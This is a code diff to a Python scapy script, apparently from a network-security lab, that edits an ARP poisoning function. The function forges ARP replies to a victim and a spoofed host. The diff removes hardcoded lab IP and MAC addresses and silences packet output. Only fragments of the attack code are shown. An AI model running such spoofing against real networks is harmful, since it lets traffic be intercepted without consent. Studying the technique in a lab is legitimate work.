@@ -1,17 +1,5 @@
 from scapy.all import *
 import util
-import time
-from threading import Lock
-
-
-attackerIP = "192.168.56.103"
-networkInterface = "enp0s3"
-
-victimIP = "192.168.56.101"
-victimMAC = "08:00:27:b0:a1:ab"
-
-spoofIP = "192.168.56.104"
-serverMAC = "08:00:27:c6:a4:61"
 
 # input :
 # - array of victim ips as array of str
@@ -45,7 +33,7 @@ def arpPoisoning(victimIP, spoofIP, networkInterface):
                     pktV[ARP].hwdst = victimMAC[i]
                     pktV[ARP].pdst = victimIP[i]
 
-                    sendp(pktV, iface=networkInterface)
+                    sendp(pktV, iface=networkInterface, verbose = False)
 
                     pktS = Ether() / ARP()
                     pktS[Ether].src = attackerMAC
@@ -54,7 +42,7 @@ def arpPoisoning(victimIP, spoofIP, networkInterface):
                     pktS[ARP].hwdst = spoofMAC[j]
                     pktS[ARP].pdst = spoofIP[j]
 
-                    sendp(pktS, iface=networkInterface)
+                    sendp(pktS, iface=networkInterface, verbose = False)
 
                     
 #arpPoisoning([victimIP], [spoofIP], networkInterface)
